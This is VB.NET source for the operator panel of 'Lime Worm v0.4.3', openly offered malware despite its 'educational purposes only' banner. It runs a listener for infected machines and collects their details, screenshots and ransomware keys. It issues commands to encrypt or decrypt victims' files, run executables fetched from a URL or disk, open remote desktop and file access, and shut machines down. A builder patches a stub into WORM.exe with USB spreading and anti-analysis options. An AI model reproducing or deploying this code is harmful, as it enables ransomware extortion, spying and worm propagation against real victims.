
'##################################################################
'##        N Y A N   C A T  |||   Updated on MAR./26/2018        ##
'##################################################################
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##            ░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░           ##
'##            ░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░           ##
'##            ░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░           ##
'##            ░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░           ##
'##            ░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░           ##
'##            ░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░           ##
'##            ░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░           ##
'##            ░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░           ##
'##            ░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░           ##
'##            ░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░           ##
'##            ░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░           ##
'##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
'##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
'##                                                              ##
'##                     .. Lime Worm v0.4.3 ..                   ##
'##                                                              ##
'##                                                              ##
'##                                                              ##
'##################################################################
'##    This project was created for educational purposes only    ##
'##################################################################
'##           https://github.com/NYAN-x-CAT/Lime-Worm            ##
'##################################################################
'##  This software's main purpose is NOT to be used maliciously  ##
'##################################################################
'## I am not responsible For any actions caused by this software ##
'##################################################################




Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class Form1
    Public WithEvents S As Listner
    Public SPL As String = "|'L'|"
    Private m_SortingColumn As ColumnHeader
    Public Shared F As Form1
    Public Shared MYPORT As Integer



#Region "Form Events"


    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        NotifyIcon1.Dispose()
        Application.Exit()
        End
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Me.Load
        Control.CheckForIllegalCrossThreadCalls = False
        ContextMenuStrip1.Renderer = New MyRenderer()
        Try
            MYPORT = InputBox("Hello " + Environment.UserName + " , Select Port", "", My.Settings.port)
            If Not MYPORT = Nothing Then
                S = New Listner(MYPORT)
                My.Settings.port = MYPORT
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try

        Me.Text = "Lime Worm v0.4.3"

        Try
            If Not IO.Directory.Exists(Application.StartupPath + "\" + "Wallpaper") Then
                IO.Directory.CreateDirectory(Application.StartupPath + "\" + "Wallpaper")
            End If
            Threading.Thread.CurrentThread.Sleep(10)
            If Not IO.Directory.Exists(Application.StartupPath + "\" + "Stub") Then
                IO.Directory.CreateDirectory(Application.StartupPath + "\" + "Stub")
            End If
            Threading.Thread.CurrentThread.Sleep(10)
            If Not IO.File.Exists(Application.StartupPath + "\" + "Wallpaper" + "\" + "Lime's wallpaper.jpg") Then
                My.Resources.Lime_s_wallpaper.Save(Application.StartupPath + "\" + "Wallpaper" + "\" + "Lime's wallpaper.jpg", Imaging.ImageFormat.Jpeg)
            End If
        Catch ex As Exception
        End Try

        EXE.Enabled = False
        PATH1.Enabled = False
        DROP.Checked = False
        PATH2.Enabled = False

    End Sub
#End Region


#Region "Server Events"
    Private Sub S_Disconnected(ByVal u As USER) Handles S.Disconnected
        SyncLock L1.Items
            Try
                L1.Items(u.IP).Remove()
                Messages("{" + u.IP.Split(":")(0) + "}", "Disconnected")
            Catch ex As Exception
            End Try
        End SyncLock
    End Sub

    Private Sub S_Connected(ByVal u As USER) Handles S.Connected
        Messages("{" + u.IP.Split(":")(0) + "}", "Connected")
    End Sub

    Delegate Sub _Data(ByVal u As USER, ByVal b() As Byte)
    Private Sub S_Data(ByVal u As USER, ByVal b() As Byte) Handles S.Data
        Dim A As String() = Split(BS(b), SPL)
        Try
            Select Case A(0)
                Case "info" ' Client Sent me PC name
                    SyncLock L1.Items
                        u.L = L1.Items.Add(u.IP, "", 0)
                        u.L.Tag = u
                        u.L.Text = A(1)
                        u.L.SubItems.Add(u.IP.Split(":")(0))
                        For i As Integer = 2 To A.Length - 1
                            u.L.SubItems.Add(A(i))
                        Next

                        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(0).Text, Nothing) IsNot Nothing Then
                            u.L.ForeColor = ColorTranslator.FromHtml(My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", u.L.SubItems(0).Text, Nothing))
                        End If

                        Fix()
                    End SyncLock

                    NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
                    NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP
                    NotifyIcon1.BalloonTipTitle = "Lime Worm | New Connection!"
                    NotifyIcon1.ShowBalloonTip(600)

                Case "ping" ' ping
                    SyncLock L1.Items
                        u.IsPinged = False
                        u.L.SubItems(PING.Index).Text = u.MS & "ms"
                        u.MS = 0
                    End SyncLock

                Case "!R"
                    SyncLock L1.Items
                        L1.Items(u.IP).SubItems(Rans.Index).Text = A(1).ToString
                    End SyncLock
                    Fix()

                Case "!U"
                    SyncLock L1.Items
                        If A(1).ToString.Contains("Spreaded!") Then
                            L1.Items(u.IP).BackColor = Color.DarkGreen
                            L1.Items(u.IP).SubItems(USB.Index).Text = "Just Spreaded!"
                        Else
                            L1.Items(u.IP).SubItems(USB.Index).Text = A(1).ToString
                        End If
                    End SyncLock
                    Fix()

                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP)

                    If Cap Is Nothing Then
                        Cap = New Cap
                        Cap.F = Me
                        Cap.u = u
                        Cap.Name = "!" + u.IP
                        Cap.Sz = New Size(A(1), A(2))
                        Cap.Show()
                    End If

                Case "@" ' i recive image  

                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim Cap As Cap = My.Application.OpenForms("!" + u.IP)
                    If Cap IsNot Nothing Then
                        If A(1).Length = 1 Then
                            Cap.Text = u.IP + " Size: " & siz(b.Length) & " ,No Changes"
                            If Cap.Button1.Text = "Stop" Then
                                S.Send(u, "@" & SPL & Cap.C1.SelectedIndex & SPL & Cap.C2.Text & SPL & Cap.C.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(b, "@" & SPL)(1)
                        Cap.PktToImage(BB)
                    End If

                Case "Details"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim D As Details = My.Application.OpenForms("D" + u.IP)
                    If D Is Nothing Then
                        D = New Details
                        D.F = Me
                        D.U = u
                        D.Name = "D" + u.IP
                        D.Text = "Details " + u.IP.Split(":")(0)
                        D.Show()
                    End If

                    D.TreeView1.Nodes(0).Nodes(0).Text = "Computer Name: " & A(1)
                    D.TreeView1.Nodes(0).Nodes(1).Text = "User Name: " & A(2)
                    D.TreeView1.Nodes(0).Nodes(2).Text = "Virtual Screen Width: " & A(3)
                    D.TreeView1.Nodes(0).Nodes(3).Text = "Virtual Screen Height: " & A(4)
                    D.TreeView1.Nodes(0).Nodes(4).Text = "Available Physical Memory: " & A(5)
                    D.TreeView1.Nodes(0).Nodes(5).Text = "Available Virtual Memory: " & A(6)
                    D.TreeView1.Nodes(0).Nodes(6).Text = "OS Full Name: " & A(7)
                    D.TreeView1.Nodes(0).Nodes(7).Text = "OS Platform: " & A(8)
                    D.TreeView1.Nodes(0).Nodes(8).Text = "OS Version: " & A(9)
                    D.TreeView1.Nodes(0).Nodes(9).Text = "Total Physical Memory: " & A(10)
                    D.TreeView1.Nodes(0).Nodes(10).Text = "Total Virtual Memory: " & A(11)
                    D.TreeView1.Nodes(0).Nodes(11).Text = "Battery Charge Status: " & A(12)
                    D.TreeView1.Nodes(0).Nodes(12).Text = "Battery Full Lifetime: " & A(13)
                    D.TreeView1.Nodes(0).Nodes(13).Text = "Battery Life Percent: " & A(14)
                    D.TreeView1.Nodes(0).Nodes(14).Text = "Battery Life Remaining: " & A(15)
                    D.TreeView1.Nodes(0).Nodes(15).Text = "CPU Info: " & A(16)
                    D.TreeView1.Nodes(0).Nodes(16).Text = "GPU Name: " & A(17)
                    D.TreeView1.Nodes(0).Nodes(17).Text = "Uptime: " & A(18)
                    D.TreeView1.Nodes(1).Nodes(0).Text = "Registered Owner: " & A(19)
                    D.TreeView1.Nodes(1).Nodes(1).Text = "Registered Organization: " & A(20)
                    D.TreeView1.Nodes(1).Nodes(2).Text = "Product Key: " & A(21)

                    Dim s As String = A(22)
                    For i = 2 To s.Length + 2 Step 3
                        s = s.Insert(i, ":")
                    Next

                    D.TreeView1.Nodes(1).Nodes(3).Text = "MAC Adress: " & s
                    D.TreeView1.Nodes(1).Nodes(4).Text = "Installed AntiVirus Engine: " & A(23)
                    D.TreeView1.Nodes(1).Nodes(5).Text = "Worm Location: " & A(24)


                Case "MSG"
                    Messages("{" + u.IP.Split(":")(0) + "}", A(1).ToString)

                Case "Key"

                    If Not IO.Directory.Exists("Users" + "\" + A(1).ToString) Then
                        IO.Directory.CreateDirectory("Users" + "\" + A(1).ToString)
                    End If
                    IO.File.WriteAllText("Users" + "\" + A(1).ToString + "\" + "KEY.txt", A(2))

                Case "DEL-KEY"
                    IO.File.Delete("Users" + "\" + A(1).ToString + "\" + "KEY.txt")

                Case "SC"
                    IO.File.WriteAllBytes("Users" + "\" + A(1).ToString + "\" + "SC.jpeg", Convert.FromBase64String(A(2)))

                Case "OFM"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim FM As Filemanager = My.Application.OpenForms("FM" + u.IP)
                    If FM Is Nothing Then
                        FM = New Filemanager
                        FM.F = Me
                        FM.U = u
                        FM.Name = "FM" + u.IP
                        FM.Text = "FM " + u.IP.Split(":")(0)
                        FM.Show()
                    End If

                Case "FM"
                    If Me.InvokeRequired Then
                        Me.Invoke(New _Data(AddressOf S_Data), u, b)
                        Exit Sub
                    End If

                    Dim FM As Filemanager = My.Application.OpenForms("FM" & u.IP)
                    If A(1) = "Error" Then
                        FM.BackToolStripMenuItem.PerformClick()
                    Else
                        FM.ListView1.Items.Clear()
                        Dim allFiles As String() = Split(A(1), "|SPL_FM|")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            itm.Text = allFiles(i)
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = itm.Text.Substring(7)
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = itm.Text.Substring(4)
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = itm.Text.Substring(8)
                            ElseIf itm.Text.EndsWith(".exe") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".bmp") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".txt") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".rar") Then
                                itm.ImageIndex = 7
                            ElseIf itm.Text.EndsWith(".wav") Then
                                itm.ImageIndex = 9
                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".mb4") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".3gp") Then
                                itm.ImageIndex = 11
                            ElseIf itm.Text.EndsWith(".mp3") Then
                                itm.ImageIndex = 12
                            ElseIf itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".Php") Or itm.Text.EndsWith(".xml") Then
                                itm.ImageIndex = 10
                            ElseIf itm.Text.EndsWith(".rar") Then
                                itm.ImageIndex = 13
                            ElseIf itm.Text.EndsWith(".Lime") Then
                                itm.ForeColor = Color.Lime
                                itm.ImageIndex = 14
                            Else
                                itm.ImageIndex = 8
                            End If
                            FM.ListView1.Items.Add(itm)
                            i += 1
                        Next
                    End If

            End Select
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try

    End Sub
#End Region


#Region "Logs"

    Public Sub Messages(ByVal user As String, ByVal msg As String)
        L2.Items.Add("[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
    End Sub

    Private Sub ListBox1_DrawItem(sender As System.Object, e As System.Windows.Forms.DrawItemEventArgs) Handles L2.DrawItem
        Try
            e.DrawBackground()

            If L2.Items(e.Index).ToString.Contains("Connected") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Lime, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Disconnected") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.DarkRed, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.Red, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))

            ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.LightSteelBlue, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
            Else
                e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Drawing.Brushes.White, New Drawing.PointF(e.Bounds.X, e.Bounds.Y))
            End If
            e.DrawFocusRectangle()
        Catch ex As Exception
        End Try
    End Sub

    Private Sub L2_Click(sender As Object, e As EventArgs) Handles L2.Click
        L2.ClearSelected()
        MAIN_TAB.Focus()
    End Sub
#End Region


#Region "Worm Options"


    Private Sub DiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = ".exe (*.exe)|*.exe"
                .Title = "UPDATE"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem.Click
        Dim URL As String = InputBox("Enter the direct link", "UPDATE", "http://site.com/file.exe")
        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE & SPL & "update")
            Next
        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Reconnect")
        Next
    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Close")
        Next
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Uninstall")
        Next
    End Sub

#End Region


#Region "Theme"

    Private Sub Fix()
        On Error Resume Next
        Me.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
    End Sub

    Private Sub Form1_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        On Error Resume Next
        Fix()
        PictureBox1.Anchor = (AnchorStyles.Bottom + AnchorStyles.Right)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            ToolStripStatusLabel1.Text = "LISTENING PORT [" & MYPORT & "]        ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
        Catch ex As Exception
        End Try
    End Sub

    Public Function KeyCount()
        Try
            If Not IO.Directory.Exists("Users") Then
                IO.Directory.CreateDirectory("Users")
            End If

            Dim fileCount As Integer = IO.Directory.GetFiles("Users", "KEY.txt", IO.SearchOption.AllDirectories).Length
            Return fileCount
        Catch ex As Exception
            Return "0"
        End Try
    End Function

    Public Function SpreadCount()
        Try
            Dim count As Integer = 0
            For Each x As ListViewItem In L1.Items
                If x.SubItems(USB.Index).Text.Contains("Spreaded!") Then
                    count += 1
                End If
            Next
            Return count
        Catch ex As Exception
            Return "0"
        End Try
    End Function


    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        Try
            If L1.SelectedItems.Count > 0 Then
                For Each x As ListViewItem In L1.SelectedItems
                    PictureBox1.ImageLocation = "Users" + "\" + x.SubItems(2).Text + "_" + x.SubItems(0).Text + "\" + "SC.jpeg"
                    PictureBox1.Visible = True
                Next
            Else
                PictureBox1.Visible = False
            End If
        Catch ex As Exception
            PictureBox1.Visible = False
        End Try
    End Sub

    Private Sub L1_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs) Handles L1.DrawColumnHeader
        Using br = New Drawing.SolidBrush(Drawing.Color.Black)
            e.DrawBackground()
            e.Graphics.FillRectangle(br, e.Bounds)
            Dim headerFont As New Font("Microsoft Sans Serif", 8, FontStyle.Bold)
            e.Graphics.DrawString(e.Header.Text, headerFont, Brushes.Lime, e.Bounds)
        End Using
    End Sub

    Private Sub L1_DrawItem(sender As Object, e As DrawListViewItemEventArgs) Handles L1.DrawItem
        If e.Item.Selected = False Then
            e.DrawDefault = True
        End If
    End Sub

    Private Sub ListViewQuote_DrawSubItem(sender As Object, e As DrawListViewSubItemEventArgs) Handles L1.DrawSubItem
        If e.Item.Selected = True Then
            e.Graphics.FillRectangle(New SolidBrush(Color.Lime), e.Bounds)
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, New Font("Microsoft Sans Serif", 9, FontStyle.Regular), New Point(e.Bounds.Left + 3, e.Bounds.Top + 2), Color.Black)
        Else
            e.DrawDefault = True
        End If
    End Sub

    Private Sub L1_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles L1.ColumnClick
        On Error Resume Next
        ' Get the new sorting column.
        Dim new_sorting_column As ColumnHeader = L1.Columns(e.Column)

        ' Figure out the new sorting order.
        Dim sort_order As System.Windows.Forms.SortOrder
        If m_SortingColumn Is Nothing Then
            ' New column. Sort ascending.
            sort_order = SortOrder.Ascending
        Else
            ' See if this is the same column.
            If new_sorting_column.Equals(m_SortingColumn) Then
                ' Same column. Switch the sort order.
                If m_SortingColumn.Text.StartsWith("> ") Then
                    sort_order = SortOrder.Descending
                Else
                    sort_order = SortOrder.Ascending
                End If
            Else
                ' New column. Sort ascending.
                sort_order = SortOrder.Ascending
            End If

            ' Remove the old sort indicator.
            m_SortingColumn.Text =
                m_SortingColumn.Text.Substring(2)
        End If

        ' Display the new sort order.
        m_SortingColumn = new_sorting_column
        If sort_order = SortOrder.Ascending Then
            m_SortingColumn.Text = "> " & m_SortingColumn.Text
        Else
            m_SortingColumn.Text = "< " & m_SortingColumn.Text
        End If

        ' Create a comparer.
        L1.ListViewItemSorter = New ListViewComparer(e.Column, sort_order)

        ' Sort.
        L1.Sort()
        Fix()
    End Sub

    Public Class MyRenderer
        Inherits ToolStripProfessionalRenderer
        Protected Overloads Overrides Sub OnRenderMenuItemBackground(ByVal e As ToolStripItemRenderEventArgs)
            Dim rc As New Rectangle(Point.Empty, e.Item.Size)
            Dim c As Color = IIf(e.Item.Selected, Color.DarkGreen, Color.Black)
            Using brush As New SolidBrush(c)
                e.Graphics.FillRectangle(brush, rc)
            End Using
        End Sub
    End Class


#End Region


#Region "Commands"

    Private Sub RemoteDesktopToolStripMenuItem_Click_1(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "!")
        Next
    End Sub

    Private Sub FromURLToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromURLToolStripMenuItem1.Click
        Dim URL As String = InputBox("Enter the direct link", "Run File", "http://site.com/file.exe")
        Dim EXE As String = InputBox("Enter the file name", "File Name", "Skype.exe")

        If String.IsNullOrEmpty(URL) Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE)
            Next
        End If
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Title = "RUN"
            End With

            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Dim R As New Ransomware
        R.ShowDialog()

        If R.OK = True Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "ENC" & SPL & R.RichTextBox1.Text & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(R.PictureBox1.ImageLocation)))
            Next
        End If
    End Sub

    Private Sub DecryptionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptionToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, "DEC" & SPL & IO.File.ReadAllText("Users" + "\" + x.SubItems(2).Text + "_" + x.SubItems(0).Text + "\" + "KEY.txt"))
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "Details")
        Next
    End Sub

    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
        MsgBox("Coded by NYAN CAT" + vbNewLine + vbNewLine + "NYANxCAT@protonmail.com" + vbNewLine, MsgBoxStyle.Information, Title:=" Lime Worm | About ")
    End Sub

    Private Sub BotColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BotColorToolStripMenuItem.Click
        Dim cDialog As New ColorDialog

        If (cDialog.ShowDialog() = DialogResult.OK) Then
            For Each x As ListViewItem In L1.SelectedItems
                x.ForeColor = cDialog.Color
                Dim CCC = ColorTranslator.ToHtml(cDialog.Color)
                My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", x.SubItems(0).Text, CCC)
            Next
        End If
    End Sub


    Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-RES")
        Next
    End Sub

    Private Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-SHUT")
        Next
    End Sub

    Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "PC-OUT")
        Next
    End Sub

    Private Sub CheckFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CheckFilesToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, "OFM")
        Next
    End Sub
#End Region


#Region "Builder"
    Private Sub ChButton1_Click(sender As Object, e As EventArgs) Handles ChButton1.Click

        If (EXE.Text = "") Then
            EXE.Text = "Wservices.exe"
        End If

        If PATH1.Text = "" Then
            PATH1.Text = "Temp"
        End If

        If Not EXE.Text.EndsWith(".exe") Then
            EXE.Text = EXE.Text + ".exe"
        End If

        If (PATH2.Text = "") Then
            PATH2.Text = Nothing
        End If

        If Not IO.File.Exists((Application.StartupPath & "\Stub\stub.exe")) Then
            Interaction.MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (HOST1.Text = "") Then
            Interaction.MsgBox("Enter DNS - IP", MsgBoxStyle.Critical, Nothing)
            Return
        ElseIf (PORT.Text = "") Then
            Interaction.MsgBox("Enter Port", MsgBoxStyle.Critical, Nothing)
            Return
        Else
            Try
                Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\Stub\stub.exe"))
                Dim definition2 As ModuleDefinition
                For Each definition2 In definition.Modules
                    Dim definition3 As TypeDefinition
                    For Each definition3 In definition2.Types
                        Dim definition4 As MethodDefinition
                        For Each definition4 In definition3.Methods
                            If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                                Dim enumerator As IEnumerator(Of Instruction)
                                Try
                                    enumerator = definition4.Body.Instructions.GetEnumerator
                                    Do While enumerator.MoveNext
                                        Dim current As Instruction = enumerator.Current
                                        If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                            Dim str As String = current.Operand.ToString
                                            If (str = "%HOST1%") Then
                                                current.Operand = HOST1.Text
                                            End If
                                            If (str = "%HOST2%") Then
                                                current.Operand = HOST2.Text
                                            End If
                                            If (str = "%PORT%") Then
                                                current.Operand = PORT.Text
                                            End If
                                            If (str = "%EXE%") Then
                                                current.Operand = EXE.Text
                                            End If
                                            If (str = "%DROP%") Then
                                                current.Operand = DROP.Checked.ToString
                                            End If
                                            If (str = "%PATH1%") Then
                                                current.Operand = PATH1.Text
                                            End If
                                            If (str = "%PATH2%") Then
                                                current.Operand = PATH2.Text
                                            End If
                                            If (str = "%USB%") Then
                                                current.Operand = USB_CHK.Checked.ToString
                                            End If
                                            If (str = "%ANTI%") Then
                                                current.Operand = ANTI.Checked.ToString
                                            End If
                                        End If
                                    Loop
                                Finally
                                End Try
                            End If
                        Next
                    Next
                Next

                definition.Write(Application.StartupPath + "\" + "WORM.exe")
                MsgBox("Your Worm Has been Created Successfully", vbInformation, "DONE!")
                My.Settings.Save()
                Me.Close()
            Catch ex1 As Exception
                MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
                Return
            End Try
        End If
    End Sub

    Private Sub DROP_CheckedChanged(sender As Object) Handles DROP.CheckedChanged

        If DROP.Checked = True Then
            EXE.Enabled = True
            PATH1.Enabled = True
            PATH2.Enabled = True
        Else
            EXE.Enabled = False
            PATH1.Enabled = False
            PATH2.Enabled = False
        End If
    End Sub


#End Region






End Class